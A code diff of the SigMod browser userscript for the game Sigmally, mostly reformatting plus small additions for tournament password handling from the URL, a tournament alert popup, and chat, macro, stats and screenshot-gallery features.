                     'inputBorder',
                     inputBorder.checked ? '1px' : '0px',
                     ['.form-control'],
-                    'borderWidth',
-                ),
+                    'borderWidth'
+                )
             );
         },
 
@@ -6066,7 +6371,7 @@
                     JSON.stringify({
                         ...JSON.parse(localStorage.getItem('settings')),
                         showChat: true,
-                    }),
+                    })
                 );
             });
 
@@ -6102,11 +6407,15 @@
             const scrollDownButton = byId('scroll-down-btn');
 
             chatContainer.addEventListener('scroll', () => {
-                if (chatContainer.scrollHeight - chatContainer.scrollTop > 300) {
+                if (
+                    chatContainer.scrollHeight - chatContainer.scrollTop >
+                    300
+                ) {
                     scrollDownButton.style.display = 'block';
                 }
                 if (
-                    chatContainer.scrollHeight - chatContainer.scrollTop < 299 &&
+                    chatContainer.scrollHeight - chatContainer.scrollTop <
+                    299 &&
                     scrollDownButton.style.display === 'block'
                 ) {
                     scrollDownButton.style.display = 'none';
@@ -6236,7 +6545,7 @@
             this.emojiMenu();
 
             const chatSettingsContainer = document.querySelector(
-                '.chatSettingsContainer',
+                '.chatSettingsContainer'
             );
             const emojisContainer = document.querySelector('.emojisContainer');
 
@@ -6335,16 +6644,26 @@
             if (this.blackListCharacters.includes(data.message)) return;
 
             const chatContainer = byId('mod-messages');
-            const isScrolledToBottom = chatContainer.scrollHeight - chatContainer.scrollTop <= chatContainer.clientHeight + 1;
-            const isNearBottom = chatContainer.scrollHeight - chatContainer.scrollTop - 200 <= chatContainer.clientHeight;
+            const isScrolledToBottom =
+                chatContainer.scrollHeight - chatContainer.scrollTop <=
+                chatContainer.clientHeight + 1;
+            const isNearBottom =
+                chatContainer.scrollHeight - chatContainer.scrollTop - 200 <=
+                chatContainer.clientHeight;
 
             let { name, message, time = '' } = data;
             name = noXSS(name);
             message = noXSS(message);
             time = data.time !== null ? prettyTime.am_pm(data.time) : '';
 
-            const color = this.friend_names.has(name) ? this.friends_settings.highlight_color : data.color || '#ffffff';
-            const glow = this.friend_names.has(name) && this.friends_settings.highlight_friends ? `text-shadow: 0 1px 3px ${color}` : '';
+            const color = this.friend_names.has(name)
+                ? this.friends_settings.highlight_color
+                : data.color || '#ffffff';
+            const glow =
+                this.friend_names.has(name) &&
+                this.friends_settings.highlight_friends
+                    ? `text-shadow: 0 1px 3px ${color}`
+                    : '';
             const id = rdmString(12);
 
             const chatMessage = document.createElement('div');
@@ -6361,12 +6680,15 @@
             `;
 
             chatContainer.append(chatMessage);
-            if (isScrolledToBottom || isNearBottom) chatContainer.scrollTop = chatContainer.scrollHeight;
+            if (isScrolledToBottom || isNearBottom)
+                chatContainer.scrollTop = chatContainer.scrollHeight;
 
             if (name === this.nick) return;
 
             const nameEl = byId(id);
-            nameEl.addEventListener('mousedown', (e) => this.handleContextMenu(e, name));
+            nameEl.addEventListener('mousedown', (e) =>
+                this.handleContextMenu(e, name)
+            );
             nameEl.addEventListener('contextmenu', (e) => {
                 e.preventDefault();
                 e.stopPropagation();
@@ -6390,16 +6712,17 @@
 
             Object.assign(contextMenu.style, {
                 top: `${e.clientY - 80}px`,
-                left: `${e.clientX}px`
+                left: `${e.clientX}px`,
             });
 
             document.body.appendChild(contextMenu);
             this.onContext = true;
 
             byId('muteButton').addEventListener('click', () => {
-                const confirmMsg = name === 'Spectator'
-                    ? 'Are you sure you want to mute all spectators until you refresh the page?'
-                    : `Are you sure you want to mute '${name}' until you refresh the page?`;
+                const confirmMsg =
+                    name === 'Spectator'
+                        ? 'Are you sure you want to mute all spectators until you refresh the page?'
+                        : `Are you sure you want to mute '${name}' until you refresh the page?`;
 
                 if (confirm(confirmMsg)) {
                     this.muteUser(name);
@@ -6428,21 +6751,24 @@
         },
 
         async getGoogleFonts() {
-            const fontFamilies = await (await fetch(this.appRoutes.fonts)).json();
+            const fontFamilies = await (
+                await fetch(this.appRoutes.fonts)
+            ).json();
 
             return fontFamilies;
         },
 
         async getEmojis() {
             const response = await fetch(
-                'https://czrsd.com/static/sigmod/emojis.json',
+                'https://czrsd.com/static/sigmod/emojis.json'
             );
             return await response.json();
         },
 
         emojiMenu() {
             const updateEmojis = (searchTerm = '') => {
-                const emojisContainer = document.querySelector('.emojisContainer');
+                const emojisContainer =
+                    document.querySelector('.emojisContainer');
                 const categoriesContainer =
                     emojisContainer.querySelector('#categories');
 
@@ -6451,14 +6777,16 @@
                     const { emoji, description, category, tags } = emojiData;
                     if (
                         !searchTerm ||
-                        tags.some((tag) => tag.includes(searchTerm.toLowerCase()))
+                        tags.some((tag) =>
+                            tag.includes(searchTerm.toLowerCase())
+                        )
                     ) {
                         let categoryId = category
                             .replace(/\s+/g, '-')
                             .replace('&', 'and')
                             .toLowerCase();
                         let categoryDiv = categoriesContainer.querySelector(
-                            `#${categoryId}`,
+                            `#${categoryId}`
                         );
                         if (!categoryDiv) {
                             categoryDiv = document.createElement('div');
@@ -6467,13 +6795,15 @@
                             categoryDiv.innerHTML = `<span>${category}</span><div class="emojiContainer"></div>`;
                             categoriesContainer.appendChild(categoryDiv);
                         }
-                        const emojiContainer = categoryDiv.querySelector('.emojiContainer');
+                        const emojiContainer =
+                            categoryDiv.querySelector('.emojiContainer');
                         const emojiDiv = document.createElement('div');
                         emojiDiv.classList.add('emoji');
                         emojiDiv.innerHTML = emoji;
                         emojiDiv.title = `${emoji} - ${description}`;
                         emojiDiv.addEventListener('click', () => {
-                            const chatInput = document.querySelector('#chatSendInput');
+                            const chatInput =
+                                document.querySelector('#chatSendInput');
                             chatInput.value += emoji;
                         });
                         emojiContainer.appendChild(emojiDiv);
@@ -6485,7 +6815,7 @@
             emojisContainer.classList.add(
                 'chatAddedContainer',
                 'emojisContainer',
-                'hidden_full',
+                'hidden_full'
             );
             emojisContainer.innerHTML = `<input type="text" class="chatInput" id="searchEmoji" style="background-color: #050505; border-radius: .5rem; flex-grow: 0;" placeholder="Search..." /><div id="categories" class="scroll"></div>`;
 
@@ -6498,7 +6828,7 @@
             document.body.append(emojisContainer);
 
             const chatSettingsContainer = document.querySelector(
-                '.chatSettingsContainer',
+                '.chatSettingsContainer'
             );
 
             byId('openEmojiMenu').addEventListener('click', () => {
@@ -6524,7 +6854,7 @@
                 'chatAddedContainer',
                 'chatSettingsContainer',
                 'scroll',
-                'hidden_full',
+                'hidden_full'
             );
             menu.innerHTML = `
                 <div class="modInfoPopup" style="display: none">
@@ -6542,13 +6872,17 @@
                                     <svg fill="#ffffff" id="Capa_1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 416.979 416.979" xml:space="preserve"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <g> <path d="M356.004,61.156c-81.37-81.47-213.377-81.551-294.848-0.182c-81.47,81.371-81.552,213.379-0.181,294.85 c81.369,81.47,213.378,81.551,294.849,0.181C437.293,274.636,437.375,142.626,356.004,61.156z M237.6,340.786 c0,3.217-2.607,5.822-5.822,5.822h-46.576c-3.215,0-5.822-2.605-5.822-5.822V167.885c0-3.217,2.607-5.822,5.822-5.822h46.576 c3.215,0,5.822,2.604,5.822,5.822V340.786z M208.49,137.901c-18.618,0-33.766-15.146-33.766-33.765 c0-18.617,15.147-33.766,33.766-33.766c18.619,0,33.766,15.148,33.766,33.766C242.256,122.755,227.107,137.901,208.49,137.901z"></path> </g> </g></svg>
                                 </span>
                             </div>
-                            <input type="text" name="location" id="modinput9" class="keybinding" value="${modSettings.macros.keys.location || ''}" placeholder="..." maxlength="1" onfocus="this.select()">
+                            <input type="text" name="location" id="modinput9" class="keybinding" value="${
+                modSettings.macros.keys.location || ''
+            }" placeholder="..." maxlength="1" onfocus="this.select()">
                         </div>
                         <div class="csRow">
                             <div class="csRowName">
                                 <span>Show / Hide</span>
                             </div>
-                            <input type="text" name="toggle.chat" id="modinput10" class="keybinding" value="${modSettings.macros.keys.toggle.chat || ''}" placeholder="..." maxlength="1" onfocus="this.select()">
+                            <input type="text" name="toggle.chat" id="modinput10" class="keybinding" value="${
+                modSettings.macros.keys.toggle.chat || ''
+            }" placeholder="..." maxlength="1" onfocus="this.select()">
                         </div>
                     </div>
                     <div class="csBlock">
@@ -6607,7 +6941,9 @@
                                 <span>Compact chat</span>
                             </div>
                             <div class="modCheckbox">
-                              <input id="compactChat" type="checkbox" ${modSettings.chat.compact ? 'checked' : ''} />
+                              <input id="compactChat" type="checkbox" ${
+                modSettings.chat.compact ? 'checked' : ''
+            } />
                               <label class="cbx" for="compactChat"></label>
                             </div>
                         </div>
@@ -6669,14 +7005,17 @@
             });
 
             showNameColors.addEventListener('change', () => {
-                const message_names = document.querySelectorAll('.message_name');
+                const message_names =
+                    document.querySelectorAll('.message_name');
                 if (showNameColors.checked) {
                     modSettings.chat.showNameColors = true;
                     updateStorage();
                 } else {
                     modSettings.chat.showNameColors = false;
                     if (message_names) {
-                        message_names.forEach((el) => (el.style.color = '#fafafa'));
+                        message_names.forEach(
+                            (el) => (el.style.color = '#fafafa')
+                        );
                     }
                     updateStorage();
                 }
@@ -6720,7 +7059,8 @@
                     const state = blurTag.checked;
 
                     state
-                        ? (tagText.classList.add('blur'), tagElement.classList.add('blur'))
+                        ? (tagText.classList.add('blur'),
+                            tagElement.classList.add('blur'))
                         : (tagText.classList.remove('blur'),
                             tagElement.classList.remove('blur'));
                     modSettings.chat.blurTag = state;
@@ -6743,7 +7083,9 @@
 
         toggleChat() {
             const modChat = document.querySelector('.modChat');
-            const modChatAdded = document.querySelectorAll('.chatAddedContainer');
+            const modChatAdded = document.querySelectorAll(
+                '.chatAddedContainer'
+            );
 
             const isModChatHidden =
                 modChat.style.display === 'none' ||
@@ -6759,7 +7101,7 @@
             } else {
                 modChat.style.opacity = 0;
                 modChatAdded.forEach((container) =>
-                    container.classList.add('hidden_full'),
+                    container.classList.add('hidden_full')
                 );
 
                 setTimeout(() => {
@@ -6769,24 +7111,29 @@
         },
 
         macroSettings() {
-            const allSettingNames = document.querySelectorAll('.setting-card-name');
+            const allSettingNames =
+                document.querySelectorAll('.setting-card-name');
 
             for (const settingName of Object.values(allSettingNames)) {
                 settingName.addEventListener('click', (event) => {
                     const settingCardWrappers = document.querySelectorAll(
-                        '.setting-card-wrapper',
+                        '.setting-card-wrapper'
                     );
-                    const currentWrapper = Object.values(settingCardWrappers).filter(
+                    const currentWrapper = Object.values(
+                        settingCardWrappers
+                    ).filter(
                         (wrapper) =>
-                            wrapper.querySelector('.setting-card-name').textContent ===
-                            settingName.textContent,
+                            wrapper.querySelector('.setting-card-name')
+                                .textContent === settingName.textContent
                     )[0];
                     const settingParameters = currentWrapper.querySelector(
-                        '.setting-parameters',
+                        '.setting-parameters'
                     );
 
                     settingParameters.style.display =
-                        settingParameters.style.display === 'none' ? 'block' : 'none';
+                        settingParameters.style.display === 'none'
+                            ? 'block'
+                            : 'none';
                 });
             }
         },
@@ -6853,9 +7200,9 @@
             const newTitle = document.createElement('div');
             newTitle.classList.add('sigmod-title');
             newTitle.innerHTML = `
-        <h1 id="title">Sigmally</h1>
-        <span id="bycursed">Mod by <a href="https://www.youtube.com/@sigmallyCursed/" target="_blank">Cursed</a></span>
-      `;
+               <h1 id="title">Sigmally</h1>
+               <span id="bycursed">Mod by <a href="https://www.youtube.com/@sigmallyCursed/" target="_blank">Cursed</a></span>
+            `;
             gameTitle.replaceWith(newTitle);
 
             const nickName = byId('nick');
@@ -6867,7 +7214,9 @@
                 mods.nick = nick;
                 const welcome = byId('welcomeUser');
                 if (welcome) {
-                    welcome.innerHTML = `Welcome ${mods.nick || 'Unnamed'}, to the SigMod Client!`;
+                    welcome.innerHTML = `Welcome ${
+                        mods.nick || 'Unnamed'
+                    }, to the SigMod Client!`;
                 }
             }
 
@@ -6903,11 +7252,16 @@
                 });
 
                 window.gameSettings.isPlaying = false;
+
+                const modMessages = document.querySelector('#mod-messages');
+                if (modMessages) {
+                    modMessages.innerHTML = '';
+                }
             });
 
             // redirect to owned skins instead of free skins
             const ot = Element.prototype.openTab;
-            Element.prototype.openTab = function(tab) {
+            Element.prototype.openTab = function (tab) {
                 if (!tab === 'skins') return;
 
                 setTimeout(() => {
@@ -6926,6 +7280,46 @@
 
                 mouseTracker.innerText = `X: ${this.mouseX}; Y: ${this.mouseY}`;
             });
+
+            if (location.search.includes('password')) {
+                const passwordField = byId('password');
+                if (passwordField) passwordField.style.display = 'none';
+
+                const password =
+                    new URLSearchParams(location.search)
+                        .get('password')
+                        ?.split('/')[0] || '';
+                passwordField.value = password; // sigfixes should know the password when multiboxing
+
+                if (window.sigfix) return;
+
+                const playBtn = byId('play-btn');
+                playBtn.addEventListener('click', (e) => {
+                    const waitForConnection = () =>
+                        new Promise((res) => {
+                            if (client?.ws?.readyState === 1) return res(null);
+                            const i = setInterval(
+                                () =>
+                                    client?.ws?.readyState === 1 &&
+                                    (clearInterval(i), res(null)),
+                                50
+                            );
+                        });
+
+                    waitForConnection().then(async () => {
+                        await wait(500);
+                        mods.sendPlay(password);
+
+                        const interval = setInterval(() => {
+                            const errormodal = byId('errormodal');
+                            if (errormodal?.style.display !== 'none')
+                                errormodal.style.display = 'none';
+                        });
+
+                        setTimeout(() => clearInterval(interval), 1000);
+                    });
+                });
+            }
         },
 
         removeStorage(storage) {
@@ -6948,9 +7342,58 @@
 ‎ ‎ ‎ ╚═════╝░░░░╚═╝░░░  ░╚════╝░░╚═════╝░╚═╝░░╚═╝╚═════╝░╚══════╝╚═════╝░ ‎ ‎ ‎
 ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎
 `,
-                'background-color: black; color: green',
+                'background-color: black; color: green'
             );
         },
+
+        handleAlert(data) {
+            const { title, description, enabled, password } = data;
+
+            if (location.pathname.includes('tournament') || client.updateAvailable) return;
+
+            if (!enabled || sessionStorage.getItem('hide-alert')) {
+                byId('scrim_alert')?.remove();
+                return;
+            }
+
+            const modAlert = document.createElement('div');
+            modAlert.id = 'scrim_alert';
+            modAlert.classList.add('modAlert');
+            modAlert.innerHTML = `
+                <div class="flex justify-sb">
+                    <strong>${title}</strong>
+                    <button class="modButton" style="width: 35px;" id="close_scrim_alert">X</button>
+                </div>
+                <span>${description}</span>
+                <div class="flex" style="align-items: center; gap: 5px;">
+                    <button id="join" class="modButton" style="width: 100%">Join</button>
+                </div>
+            `;
+            document.body.append(modAlert);
+
+            const observer = new MutationObserver(() => {
+                modAlert.style.display = menuClosed() ? 'none' : 'flex';
+            });
+
+            observer.observe(document.body, {
+                attributes: true,
+                childList: true,
+                subtree: true,
+            });
+
+            const joinButton = byId('join');
+            joinButton.addEventListener('click', () => {
+                location.href = `https://one.sigmally.com/tournament?password=${password}`;
+            });
+
+            const close = byId('close_scrim_alert');
+            close.addEventListener('click', () => {
+                modAlert.remove();
+                // make it not that annoying
+                sessionStorage.setItem('hide-alert', true);
+            });
+        },
+
         saveNames() {
             let savedNames = modSettings.settings.savedNames;
             let savedNamesOutput = byId('savedNames');
@@ -6974,7 +7417,7 @@
                     navigator.clipboard.writeText(name).then(() => {
                         this.modAlert(
                             `Added the name '${name}' to your clipboard!`,
-                            'success',
+                            'success'
                         );
                     });
                 });
@@ -6982,13 +7425,15 @@
                 delName.addEventListener('click', () => {
                     if (
                         confirm(
-                            'Are you sure you want to delete the name \'' +
+                            "Are you sure you want to delete the name '" +
                             nameLabel.innerText +
-                            '\'?',
+                            "'?"
                         )
                     ) {
                         nameDiv.remove();
-                        savedNames = savedNames.filter((n) => n !== nameLabel.innerText);
+                        savedNames = savedNames.filter(
+                            (n) => n !== nameLabel.innerText
+                        );
                         modSettings.settings.savedNames = savedNames;
                         updateStorage();
                     }
@@ -7043,7 +7488,10 @@
                     'total-deaths': 0,
                     'total-mass': 0,
                 };
-                localStorage.setItem('game-stats', JSON.stringify(this.storage));
+                localStorage.setItem(
+                    'game-stats',
+                    JSON.stringify(this.storage)
+                );
             } else {
                 this.storage = JSON.parse(this.storage);
             }
@@ -7075,7 +7523,8 @@
                     element.innerHTML = formattedTime;
                 } else {
                     const formattedValue =
-                        stat === 'stat-highest-mass' || stat === 'stat-total-mass'
+                        stat === 'stat-highest-mass' ||
+                        stat === 'stat-total-mass'
                             ? value > 999
                                 ? `${(value / 1000).toFixed(1)}k`
                                 : value.toString()
@@ -7149,7 +7598,8 @@
                     const playTimer = document.querySelector('.playTimer');
                     if (playTimer) playTimer.remove();
 
-                    const mouseTracker = document.querySelector('.mouseTracker');
+                    const mouseTracker =
+                        document.querySelector('.mouseTracker');
                     if (mouseTracker) mouseTracker.remove();
 
                     const score = parseFloat(byId('highest_mass').innerText);
@@ -7157,11 +7607,17 @@
 
                     if (score > highest) {
                         this.storage['highest-mass'] = score;
-                        this.updateStat('highest-mass', this.storage['highest-mass']);
+                        this.updateStat(
+                            'highest-mass',
+                            this.storage['highest-mass']
+                        );
                     }
 
                     this.storage['total-deaths']++;
-                    this.updateStat('total-deaths', this.storage['total-deaths']);
+                    this.updateStat(
+                        'total-deaths',
+                        this.storage['total-deaths']
+                    );
 
                     this.storage['total-mass'] += score;
                     this.updateStat('total-mass', this.storage['total-mass']);
@@ -7180,7 +7636,7 @@
                 } else if (!isDead()) {
                     dead = false;
                     const challengesDeathscreen = document.querySelector(
-                        '.challenges_deathscreen',
+                        '.challenges_deathscreen'
                     );
                     if (challengesDeathscreen) challengesDeathscreen.remove();
                 }
@@ -7197,7 +7653,7 @@
         async showChallenges() {
             const challengeData = await (
                 await fetch(
-                    `https://sigmally.com/api/user/challenge/${window.gameSettings.user.email}`,
+                    `https://sigmally.com/api/user/challenge/${window.gameSettings.user.email}`
                 )
             ).json();
 
@@ -7218,13 +7674,16 @@
                 challenges = allChallenges
                     .filter(({ status }) => !status)
                     .map(({ task, best, status, ready, goal }) => {
-                        const desc = shopLocales.challenge_tab.tasks[task].replace(
-                            '%n',
-                            task === 'alive' ? goal / 60 : goal,
-                        );
+                        const desc = shopLocales.challenge_tab.tasks[
+                            task
+                            ].replace('%n', task === 'alive' ? goal / 60 : goal);
                         const btn = ready
                             ? `<button class="challenge-collect-secondary" onclick="this.challenge('${task}', ${status})">${shopLocales.challenge_tab.collect}</button>`
-                            : `<div class="challenge-best-secondary">${shopLocales.challenge_tab.result}${Math.round(best)}${task === 'alive' ? 's' : ''}</div>`;
+                            : `<div class="challenge-best-secondary">${
+                                shopLocales.challenge_tab.result
+                            }${Math.round(best)}${
+                                task === 'alive' ? 's' : ''
+                            }</div>`;
                         return `
                         <div class="challenge-row">
                           <div class="challenge-desc">${desc}</div>
@@ -7260,24 +7719,28 @@
                 let selectedTheme;
                 selectedTheme =
                     window.themes.defaults.find(
-                        (theme) => theme.name === modSettings.themes.current,
+                        (theme) => theme.name === modSettings.themes.current
                     ) ||
                     modSettings.themes.custom.find(
-                        (theme) => theme.name === modSettings.themes.current,
+                        (theme) => theme.name === modSettings.themes.current
                     ) ||
                     null;
                 if (!selectedTheme) {
                     selectedTheme =
                         window.themes.orderly.find(
-                            (theme) => theme.name === modSettings.themes.current,
+                            (theme) => theme.name === modSettings.themes.current
                         ) ||
                         modSettings.themes.custom.find(
-                            (theme) => theme.name === modSettings.themes.current,
+                            (theme) => theme.name === modSettings.themes.current
                         );
                 }
 
                 if (selectedTheme) {
-                    toggleColor(modal, selectedTheme.background, selectedTheme.text);
+                    toggleColor(
+                        modal,
+                        selectedTheme.background,
+                        selectedTheme.text
+                    );
                 }
             }
 
@@ -7290,7 +7753,8 @@
                     .querySelectorAll('.challenge-collect-secondary')
                     .forEach((btn) => {
                         btn.addEventListener('click', () => {
-                            const parentChallengeRow = btn.closest('.challenge-row');
+                            const parentChallengeRow =
+                                btn.closest('.challenge-row');
                             if (parentChallengeRow) {
                                 setTimeout(() => {
                                     parentChallengeRow.remove();
@@ -7391,7 +7855,9 @@
 
             async function split(times) {
                 if (times > 0) {
-                    window.dispatchEvent(new KeyboardEvent('keydown', KEY_SPLIT));
+                    window.dispatchEvent(
+                        new KeyboardEvent('keydown', KEY_SPLIT)
+                    );
                     window.dispatchEvent(new KeyboardEvent('keyup', KEY_SPLIT));
                     split(times - 1);
                 }
@@ -7498,9 +7964,12 @@
                         });
 
                         if (modSettings.macros.mouse.right === 'freeze') {
-                            freezeOverlay.addEventListener('contextmenu', (e) => {
-                                e.preventDefault();
-                            });
+                            freezeOverlay.addEventListener(
+                                'contextmenu',
+                                (e) => {
+                                    e.preventDefault();
+                                }
+                            );
                         }
                     }
 
@@ -7510,7 +7979,9 @@
                         freezeKeyPressed = false;
                     }
 
-                    document.querySelector('.body__inner').append(freezeOverlay);
+                    document
+                        .querySelector('.body__inner')
+                        .append(freezeOverlay);
 
                     freezeKeyPressed = true;
                 } else {
@@ -7610,7 +8081,9 @@
             }
 
             function toggleSettings(setting) {
-                const settingElement = document.querySelector(`input#${setting}`);
+                const settingElement = document.querySelector(
+                    `input#${setting}`
+                );
                 if (settingElement) {
                     settingElement.click();
                 } else {
@@ -7649,7 +8122,7 @@
                         keydown = true;
                         ff = setInterval(
                             () => keypress('w', 'KeyW'),
-                            modSettings.macros.feedSpeed,
+                            modSettings.macros.feedSpeed
                         );
                     }
                 }
@@ -7902,7 +8375,7 @@
             const numModInputs = 18;
             const macroInputs = Array.from(
                 { length: numModInputs },
-                (_, i) => `modinput${i + 1}`,
+                (_, i) => `modinput${i + 1}`
             );
 
             macroInputs.forEach((modkey) => {
@@ -7922,11 +8395,15 @@
 
                     const isDuplicate = macroInputs.some((key) => {
                         const input = byId(key);
-                        return input && input !== modInput && input.value === newValue;
+                        return (
+                            input &&
+                            input !== modInput &&
+                            input.value === newValue
+                        );
                     });
 
                     if (newValue && isDuplicate) {
-                        alert('You can\'t use 2 keybindings at the same time.');
+                        alert("You can't use 2 keybindings at the same time.");
                         setTimeout(() => (modInput.value = ''), 0);
                         return;
                     }
@@ -7939,7 +8416,9 @@
                 const properties = propertyName.split('.');
                 let settings = modSettings.macros.keys;
 
-                properties.slice(0, -1).forEach((prop) => (settings = settings[prop]));
+                properties
+                    .slice(0, -1)
+                    .forEach((prop) => (settings = settings[prop]));
                 settings[properties.pop()] = value;
 
                 updateStorage();
@@ -7950,7 +8429,7 @@
             modNumberInput.addEventListener('keydown', (event) => {
                 if (
                     !['Backspace', 'ArrowLeft', 'ArrowRight', 'Tab'].includes(
-                        event.key,
+                        event.key
                     ) &&
                     !/^[0-9]$/.test(event.key)
                 ) {
@@ -7968,7 +8447,9 @@
                 request.onupgradeneeded = (event) => {
                     const db = event.target.result;
                     if (!db.objectStoreNames.contains('images')) {
-                        db.createObjectStore('images', { keyPath: 'timestamp' });
+                        db.createObjectStore('images', {
+                            keyPath: 'timestamp',
+                        });
                     }
                 };
 
@@ -7989,7 +8470,7 @@
 
                 if (!dataURL) {
                     console.error(
-                        'Failed to capture the image. The canvas might be empty or the rendering is incomplete.',
+                        'Failed to capture the image. The canvas might be empty or the rendering is incomplete.'
                     );
                     return;
                 }
@@ -7998,7 +8479,7 @@
 
                 if (!indexedDB)
                     return alert(
-                        'Your browser does not support indexedDB. Please update your browser.',
+                        'Your browser does not support indexedDB. Please update your browser.'
                     );
 
                 try {
@@ -8009,7 +8490,8 @@
 
                     await new Promise((resolve, reject) => {
                         transaction.oncomplete = resolve;
-                        transaction.onerror = (event) => reject(event.target.error);
+                        transaction.onerror = (event) =>
+                            reject(event.target.error);
                     });
 
                     this.addImageToGallery({ timestamp, dataURL });
@@ -8029,12 +8511,20 @@
 
             const imageHTML = `
 				<div class="image-container">
-					<img class="gallery-image lazy" data-src="${image.dataURL}" src="${placeholderURL}" data-image-id="${image.timestamp}" />
+					<img class="gallery-image lazy" data-src="${
+                image.dataURL
+            }" src="${placeholderURL}" data-image-id="${
+                image.timestamp
+            }" />
 					<div class="justify-sb">
 						<span class="modDescText">${prettyTime.fullDate(image.timestamp, true)}</span>
 						<div class="centerXY g-5">
-							<button type="button" class="download_btn operation_btn" data-image-id="${image.timestamp}"></button>
-							<button type="button" class="delete_btn operation_btn" data-image-id="${image.timestamp}"></button>
+							<button type="button" class="download_btn operation_btn" data-image-id="${
+                image.timestamp
+            }"></button>
+							<button type="button" class="delete_btn operation_btn" data-image-id="${
+                image.timestamp
+            }"></button>
 						</div>
 					</div>
 				</div>
@@ -8043,16 +8533,18 @@
             galleryElement.insertAdjacentHTML('afterbegin', imageHTML);
 
             const lazyImages = document.querySelectorAll('.lazy');
-            const imageObserver = new IntersectionObserver((entries, observer) => {
-                entries.forEach((entry) => {
-                    if (entry.isIntersecting) {
-                        const image = entry.target;
-                        image.src = image.getAttribute('data-src');
-                        image.classList.remove('lazy');
-                        observer.unobserve(image);
-                    }
-                });
-            });
+            const imageObserver = new IntersectionObserver(
+                (entries, observer) => {
+                    entries.forEach((entry) => {
+                        if (entry.isIntersecting) {
+                            const image = entry.target;
+                            image.src = image.getAttribute('data-src');
+                            image.classList.remove('lazy');
+                            observer.unobserve(image);
+                        }
+                    });
+                }
+            );
 
             lazyImages.forEach((image) => {
                 imageObserver.observe(image);
@@ -8093,14 +8585,19 @@
 
                         gallery.forEach((item) => {
                             const imageData = item.dataURL.split(',')[1];
-                            const imgExtension = item.dataURL.split(';')[0].split('/')[1];
-                            zip.file(`${item.timestamp}.${imgExtension}`, imageData, {
-                                base64: true,
-                            });
+                            const imgExtension = item.dataURL
+                                .split(';')[0]
+                                .split('/')[1];
+                            zip.file(
+                                `${item.timestamp}.${imgExtension}`,
+                                imageData,
+                                {
+                                    base64: true,
+                                }
+                            );
                         });
 
-                        zip
-                            .generateAsync({ type: 'blob' })
+                        zip.generateAsync({ type: 'blob' })
                             .then((zipContent) => {
                                 const a = document.createElement('a');
                                 a.href = URL.createObjectURL(zipContent);
@@ -8108,18 +8605,25 @@
                                 a.click();
                             })
                             .catch((error) => {
-                                console.error('Error generating ZIP file:', error);
+                                console.error(
+                                    'Error generating ZIP file:',
+                                    error
+                                );
                             });
                     });
 
                     deleteAll.addEventListener('click', () => {
                         const confirmDelete = confirm(
-                            'Are you sure you want to delete all images? This action cannot be undone.',
+                            'Are you sure you want to delete all images? This action cannot be undone.'
                         );
                         if (!confirmDelete) return;
 
-                        const deleteTransaction = db.transaction('images', 'readwrite');
-                        const deleteStore = deleteTransaction.objectStore('images');
+                        const deleteTransaction = db.transaction(
+                            'images',
+                            'readwrite'
+                        );
+                        const deleteStore =
+                            deleteTransaction.objectStore('images');
                         deleteStore.clear();
 
                         deleteTransaction.oncomplete = () => {
@@ -8137,22 +8641,29 @@
                         .map(
                             (item) => `
 						<div class="image-container">
-							<img class="gallery-image lazy" data-src="${item.dataURL}" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==" data-image-id="${item.timestamp}" />
+							<img class="gallery-image lazy" data-src="${
+                                item.dataURL
+                            }" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==" data-image-id="${
+                                item.timestamp
+                            }" />
 							<div class="justify-sb">
 								<span class="modDescText">${prettyTime.fullDate(item.timestamp, true)}</span>
 								<div class="centerXY g-5">
-									<button type="button" class="download_btn operation_btn" data-image-id="${item.timestamp}"></button>
-									<button type="button" class="delete_btn operation_btn" data-image-id="${item.timestamp}"></button>
+									<button type="button" class="download_btn operation_btn" data-image-id="${
+                                item.timestamp
+                            }"></button>
+									<button type="button" class="delete_btn operation_btn" data-image-id="${
+                                item.timestamp
+                            }"></button>
 								</div>
 							</div>
 						</div>
-					`,
+					`
                         )
                         .join('');
 
                     galleryElement.innerHTML = galleryHTML;
 
-                    // Use Intersection Observer to load images
                     const lazyImages = document.querySelectorAll('.lazy');
                     const imageObserver = new IntersectionObserver(
                         (entries, observer) => {
@@ -8164,7 +8675,7 @@
                                     observer.unobserve(image);
                                 }
                             });
-                        },
+                        }
                     );
 
                     lazyImages.forEach((image) => {
@@ -8188,20 +8699,24 @@
                 });
             });
 
-            galleryElement.querySelectorAll('.download_btn').forEach((button) => {
-                button.addEventListener('click', () => {
-                    const imageId = button.getAttribute('data-image-id');
-                    const image = gallery.find(
-                        (item) => item.timestamp === parseInt(imageId, 10),
-                    );
-                    if (image) {
-                        const link = document.createElement('a');
-                        link.href = image.dataURL;
-                        link.download = `Sigmally ${this.sanitizeFilename(prettyTime.fullDate(image.timestamp, true))}.png`;
-                        link.click();
-                    }
+            galleryElement
+                .querySelectorAll('.download_btn')
+                .forEach((button) => {
+                    button.addEventListener('click', () => {
+                        const imageId = button.getAttribute('data-image-id');
+                        const image = gallery.find(
+                            (item) => item.timestamp === parseInt(imageId, 10)
+                        );
+                        if (image) {
+                            const link = document.createElement('a');
+                            link.href = image.dataURL;
+                            link.download = `Sigmally ${this.sanitizeFilename(
+                                prettyTime.fullDate(image.timestamp, true)
+                            )}.png`;
+                            link.click();
+                        }
+                    });
                 });
-            });
 
             galleryElement.querySelectorAll('.delete_btn').forEach((button) => {
                 button.addEventListener('click', (e) => {
@@ -8218,7 +8733,7 @@
             const blob = this.dataURLToBlob(dataURL);
             const url = URL.createObjectURL(blob);
             const imgWindow = window.open(url, '_blank');
-            // Release the object URL after a short delay
+
             if (imgWindow) {
                 setTimeout(() => URL.revokeObjectURL(url), 1000);
             }
@@ -8260,11 +8775,15 @@
